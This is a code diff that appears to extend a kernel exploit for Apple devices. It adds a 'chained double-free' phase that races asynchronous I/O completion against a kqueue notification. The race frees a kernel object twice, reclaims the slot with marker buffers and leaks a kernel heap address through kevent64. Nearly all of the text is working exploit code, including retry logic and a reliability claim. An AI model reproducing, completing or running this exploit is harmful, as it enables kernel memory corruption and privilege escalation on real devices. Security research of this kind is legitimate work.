@@ -5642,8 +5642,9 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // racing aio_return() frees entry → dangling knote → double-free.
 // CPU-affinity LIFO reclaim achieves ~70% reliability on A15.
 //
-// Confirms ext[1] control via reclaim aio_nbytes (0x4141 marker).
+// Confirms ext[1] control via reclaim aio_nbytes (0x2000 marker).
 // Leaks kernel heap address via kevent64 ident field.
+// Phase C: chained double-free — same slot freed twice, confirm reuse.
 
 - (void)aioUafTapped {
     [self appendLog:@"\n========== AIO Kevent Double-Free =========="];
@@ -5777,6 +5778,120 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             }
         }
         close(kq);
+    }
+
+    // ---- Phase C: Chained double-free (same slot, second round) ----
+    // After Phase A cleanup, the double-freed slot is on the kalloc.256 freelist.
+    // A second allocation from this zone reuses the same slot → chained double-free.
+    // If ident matches Phase A, same slot confirmed → zone freelist corruption.
+
+    [self appendLog:@"\n--- Phase C: Chained double-free (round 2) ---"];
+
+    for (int attempt = 0; attempt < 5; attempt++) {
+        [self appendLog:[NSString stringWithFormat:@"Phase C attempt %d", attempt]];
+
+        int kq2 = kqueue();
+        if (kq2 < 0) { [self appendLog:@"  kqueue failed"]; continue; }
+
+        // Fresh trigger and reclaim entries for round 2
+        static struct aiocb tcb2;
+        static char tbuf2[4096];
+        memset(&tcb2, 0, sizeof(tcb2));
+        tcb2.aio_fildes = fd;
+        tcb2.aio_buf = tbuf2;
+        tcb2.aio_nbytes = sizeof(tbuf2);
+        tcb2.aio_offset = 0;
+        tcb2.aio_lio_opcode = LIO_READ;
+        tcb2.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        tcb2.aio_sigevent.sigev_signo = kq2;
+        tcb2.aio_sigevent.sigev_value.sival_ptr = (void *)0xCC;
+
+        // Reclaim with yet another distinct nbytes (0x3000) for identification
+        static struct aiocb rcbs2[AIO_NRECLAIM];
+        static char rbufs2[AIO_NRECLAIM][16384];
+        for (int i = 0; i < AIO_NRECLAIM; i++) {
+            memset(&rcbs2[i], 0, sizeof(rcbs2[i]));
+            rcbs2[i].aio_fildes = fd;
+            rcbs2[i].aio_buf = rbufs2[i];
+            rcbs2[i].aio_nbytes = 0x3000;  // 12288 — distinct marker
+            rcbs2[i].aio_offset = 0;
+            rcbs2[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        }
+
+        struct aio_race_state rs2 = {};
+        rs2.trigger = &tcb2;
+        rs2.rcbs = rcbs2;
+        rs2.nrcbs = AIO_NRECLAIM;
+
+        pthread_t thr2;
+        pthread_create(&thr2, NULL, aio_free_and_reclaim_racer, &rs2);
+        atomic_store_explicit(&rs2.start, true, memory_order_release);
+
+        struct aiocb *ptr2 = &tcb2;
+        struct sigevent sig2 = {};
+        sig2.sigev_notify = SIGEV_NONE;
+        lio_listio(LIO_NOWAIT, &ptr2, 1, &sig2);
+
+        usleep(500);
+        atomic_store_explicit(&rs2.stop, true, memory_order_release);
+        pthread_join(thr2, NULL);
+
+        int freed2 = atomic_load(&rs2.freed);
+        bool reclaimed2 = atomic_load(&rs2.reclaim_done);
+
+        if (freed2 == 0) {
+            while (aio_error(&tcb2) == EINPROGRESS) usleep(500);
+            aio_return(&tcb2);
+            close(kq2);
+            [self appendLog:@"  Phase C race lost, retrying"];
+            continue;
+        }
+        if (!reclaimed2) {
+            close(kq2);
+            [self appendLog:@"  Phase C freed but no reclaim, retrying"];
+            continue;
+        }
+
+        for (int i = 0; i < AIO_NRECLAIM; i++)
+            while (aio_error(&rcbs2[i]) == EINPROGRESS) usleep(500);
+
+        struct kevent64_s kev2 = {};
+        struct timespec ts2 = {10, 0};
+        int nev2 = kevent64(kq2, NULL, 0, &kev2, 1, 0, &ts2);
+
+        if (nev2 > 0) {
+            [self appendLog:@"*** PHASE C: CHAINED DOUBLE-FREE ACHIEVED ***"];
+            [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx (vs Phase A: 0x%llx)", kev2.ident, self.leakedKernelAddr]];
+            [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx", kev2.ext[0]]];
+            [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (returnval)", kev2.ext[1]]];
+            [self appendLog:[NSString stringWithFormat:@"  udata  = 0x%llx", kev2.udata]];
+
+            if (kev2.ext[1] == 0x3000) {
+                [self appendLog:@"  >> ext[1]=0x3000 confirms reclaim entry source <<"];
+            }
+
+            // Check if ident is close to Phase A's (same zone region)
+            uint64_t delta = (kev2.ident > self.leakedKernelAddr)
+                ? (kev2.ident - self.leakedKernelAddr)
+                : (self.leakedKernelAddr - kev2.ident);
+            if (delta <= 0x1000) {
+                [self appendLog:[NSString stringWithFormat:@"  >> ident delta=0x%llx — same zone region (likely same slot) <<", delta]];
+            }
+
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
+                if (aio_error(&rcbs2[i]) != EINVAL)
+                    aio_return(&rcbs2[i]);
+            }
+            close(kq2);
+            break;
+        } else {
+            [self appendLog:@"  kevent64 timeout"];
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
+                if (aio_error(&rcbs2[i]) != EINVAL)
+                    aio_return(&rcbs2[i]);
+            }
+        }
+        close(kq2);
     }
 
     close(fd);
